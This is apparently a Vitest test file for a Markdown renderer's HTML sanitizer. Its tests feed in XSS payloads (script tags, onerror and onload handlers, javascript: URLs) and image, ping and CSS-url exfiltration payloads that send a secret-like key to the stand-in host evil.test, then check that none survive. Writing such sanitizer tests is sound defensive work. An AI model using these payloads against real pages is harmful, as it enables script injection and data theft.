import { afterEach, describe, expect, it, vi } from 'vitest';
import { renderMarkdown } from './markdown';

/** Renders into a detached container so the result can be queried. */
async function render(markdown: string): Promise<HTMLElement> {
  const container = document.createElement('div');
  container.append(await renderMarkdown(markdown));
  return container;
}

/** True if any element carries an inline event handler attribute. */
function hasEventHandlerAttribute(root: HTMLElement): boolean {
  return [...root.querySelectorAll('*')].some((el) =>
    el.getAttributeNames().some((name) => name.toLowerCase().startsWith('on')),
  );
}

/** Attributes that make a browser fetch something without a click. */
const AUTO_LOADING_ATTRIBUTES = [
  'src',
  'srcset',
  'poster',
  'background',
  'data',
  'ping',
  'action',
  'formaction',
  'xlink:href',
  'style',
];

describe('renderMarkdown', () => {
  it('returns a DocumentFragment', async () => {
    expect(await renderMarkdown('hello')).toBeInstanceOf(DocumentFragment);
  });

  it('renders common Markdown', async () => {
    const out = await render(
      [
        '# Title',
        '',
        'Some **bold** and `code`.',
        '',
        '- one',
        '- two',
        '',
        '```js',
        'x()',
        '```',
      ].join('\n'),
    );
    expect(out.querySelector('h1')?.textContent).toBe('Title');
    expect(out.querySelector('strong')?.textContent).toBe('bold');
    expect(out.querySelectorAll('li')).toHaveLength(2);
    expect(out.querySelector('pre code')?.textContent).toContain('x()');
  });

  it('renders GFM tables', async () => {
    const out = await render('| a | b |\n| - | - |\n| 1 | 2 |');
    expect(out.querySelectorAll('th')).toHaveLength(2);
    expect(out.querySelectorAll('td')).toHaveLength(2);
  });

  it('keeps GFM task-list checkboxes, disabled', async () => {
    const out = await render('- [x] done\n- [ ] todo');
    const boxes = [...out.querySelectorAll('input')];
    expect(boxes).toHaveLength(2);
    expect(boxes.map((box) => box.type)).toEqual(['checkbox', 'checkbox']);
    expect(boxes.map((box) => box.checked)).toEqual([true, false]);
    expect(boxes.every((box) => box.disabled)).toBe(true);
  });

  it('removes inputs that are not task-list checkboxes', async () => {
    const out = await render(
      '<input type="text" value="x"> <input type="image" src="https://evil.test/i.png"> <input type="checkbox" onclick="x()" name="n">',
    );
    const boxes = [...out.querySelectorAll('input')];
    expect(boxes).toHaveLength(1);
    expect(boxes[0]?.getAttributeNames().sort()).toEqual(['disabled', 'type']);
  });

  describe('links', () => {
    it('open in a new tab without opener or referrer', async () => {
      const link = (await render('[site](https://example.com/)')).querySelector('a');
      expect(link?.getAttribute('href')).toBe('https://example.com/');
      expect(link?.getAttribute('target')).toBe('_blank');
      expect(link?.getAttribute('rel')).toBe('noopener noreferrer');
    });

    it('stay in the page when they point at a fragment', async () => {
      const link = (await render('[jump](#usage)')).querySelector('a');
      expect(link?.getAttribute('href')).toBe('#usage');
      expect(link?.hasAttribute('target')).toBe(false);
    });
  });

  describe('images', () => {
    it('turns a remote image into a link showing its alt text and host', async () => {
      const out = await render('![a chart](https://cdn.example.com/chart.png)');
      expect(out.querySelector('img')).toBeNull();
      const link = out.querySelector('a');
      expect(link?.getAttribute('href')).toBe('https://cdn.example.com/chart.png');
      expect(link?.textContent).toBe('a chart (cdn.example.com)');
      expect(link?.getAttribute('target')).toBe('_blank');
      expect(link?.getAttribute('rel')).toBe('noopener noreferrer');
    });

    it('labels a remote image without alt text', async () => {
      const out = await render('<img src="http://example.com/x.png">');
      expect(out.querySelector('a')?.textContent).toBe('Image (example.com)');
    });

    it('keeps data: and blob: images inline', async () => {
      const png = 'data:image/png;base64,iVBORw0KGgo=';
      const out = await render(`![dot](${png})\n\n<img src="blob:https://x.test/1" alt="b">`);
      expect([...out.querySelectorAll('img')].map((img) => img.getAttribute('src'))).toEqual([
        png,
        'blob:https://x.test/1',
      ]);
    });

    it('replaces relative or malformed image sources with their alt text', async () => {
      const out = await render('![local](images/x.png) <img src="x" alt="bad">');
      expect(out.querySelector('img, a')).toBeNull();
      expect(out.textContent).toContain('local');
      expect(out.textContent).toContain('bad');
    });
  });

  describe('neutralises XSS payloads', () => {
    it('removes script elements', async () => {
      const out = await render('before <script>window.pwned = 1</script> after');
      expect(out.querySelector('script')).toBeNull();
      expect(out.textContent).not.toContain('pwned');
    });

    it('removes inline event handlers', async () => {
      const out = await render(
        [
          '<img src="data:image/png;base64,AA==" onerror="alert(1)">',
          '<svg onload="alert(1)"><circle r="1"/></svg>',
          '<details open ontoggle="alert(1)">x</details>',
          '<a href="#" onclick="alert(1)">click</a>',
        ].join('\n\n'),
      );
      expect(hasEventHandlerAttribute(out)).toBe(false);
      expect(out.querySelector('img')?.getAttribute('src')).toBe('data:image/png;base64,AA==');
    });

    it('removes javascript: URLs from Markdown and HTML links', async () => {
      const out = await render(
        '[md](javascript:alert(1))\n\n<a href="javascript:alert(1)">html</a>\n\n<a href="JaVaScRiPt:alert(1)">mixed</a>',
      );
      for (const link of out.querySelectorAll('a')) {
        expect(link.getAttribute('href') ?? '').not.toMatch(/^\s*javascript:/i);
      }
    });

    it('removes frames, objects, media, forms and style', async () => {
      const out = await render(
        [
          '<iframe src="https://example.com/"></iframe>',
          '<object data="x"></object>',
          '<embed src="x">',
          '<form action="https://example.com/"><input name="key"><button>Send</button></form>',
          '<style>body { display: none }</style>',
          '<p style="position:fixed;inset:0">overlay</p>',
          '<video src="x.mp4" poster="p.png"></video><audio src="a.mp3"></audio>',
        ].join('\n\n'),
      );
      expect(
        out.querySelector('iframe, object, embed, form, button, style, video, audio, source'),
      ).toBeNull();
      expect(out.querySelector('[style]')).toBeNull();
      expect(out.textContent).toContain('overlay');
    });

    it('strips id and name, which could clobber page globals', async () => {
      const out = await render('<a id="app" name="settings" href="#x">x</a><p id="top">y</p>');
      expect(out.querySelector('[id], [name]')).toBeNull();
    });

    it('survives a payload hidden in a code block as text', async () => {
      const out = await render('```html\n<script>alert(1)</script>\n```');
      expect(out.querySelector('script')).toBeNull();
      expect(out.querySelector('code')?.textContent).toContain('<script>alert(1)</script>');
    });
  });

  it('never leaves an element that loads a remote resource by itself (exfiltration)', async () => {
    const secret = 'sk-or-v1-secret';
    const out = await render(
      [
        `![x](https://evil.test/a.png?k=${secret})`,
        `<img src="https://evil.test/b.png?k=${secret}" srcset="https://evil.test/c.png 2x">`,
        `<image src="https://evil.test/d.png">`,
        `<picture><source srcset="https://evil.test/e.png"><img src="https://evil.test/f.png"></picture>`,
        `<video poster="https://evil.test/g.png"><source src="https://evil.test/h.mp4"></video>`,
        `<audio src="https://evil.test/i.mp3"></audio>`,
        `<table background="https://evil.test/j.png"><tr><td>t</td></tr></table>`,
        `<a href="https://example.com/" ping="https://evil.test/k">ok</a>`,
        `<input type="image" src="https://evil.test/l.png">`,
        `<object data="https://evil.test/m.swf"></object>`,
        `<svg><image href="https://evil.test/n.png"/></svg>`,
        `<link rel="stylesheet" href="https://evil.test/o.css">`,
        `<p style="background:url(https://evil.test/p.png)">p</p>`,
        `<map name="m"><area href="https://evil.test/q" shape="rect"></map>`,
      ].join('\n\n'),
    );

    for (const el of out.querySelectorAll('*')) {
      for (const attribute of AUTO_LOADING_ATTRIBUTES) {
        expect(el.getAttribute(attribute) ?? '', `<${el.localName} ${attribute}>`).not.toMatch(
          /evil\.test/,
        );
      }
    }
    expect(out.querySelector('img, image, picture, source, video, audio, link, svg')).toBeNull();
    // The remote images remain visible as links the user may choose to open.
    expect(out.querySelectorAll('a[href^="https://evil.test/"]').length).toBeGreaterThan(0);
  });

  describe('library loading', () => {
    afterEach(() => {
      vi.doUnmock('marked');
      vi.resetModules();
    });

    it('retries after a failed import instead of remembering the failure', async () => {
      vi.resetModules();
      let fail = true;
      vi.doMock('marked', async (importOriginal) => {
        if (fail) throw new Error('chunk failed to load');
        return importOriginal();
      });
      const { renderMarkdown: fresh } = await import('./markdown');

      await expect(fresh('x')).rejects.toThrow();
      fail = false;
      expect((await fresh('**ok**')).textContent).toBe('ok\n');
    });
  });
});
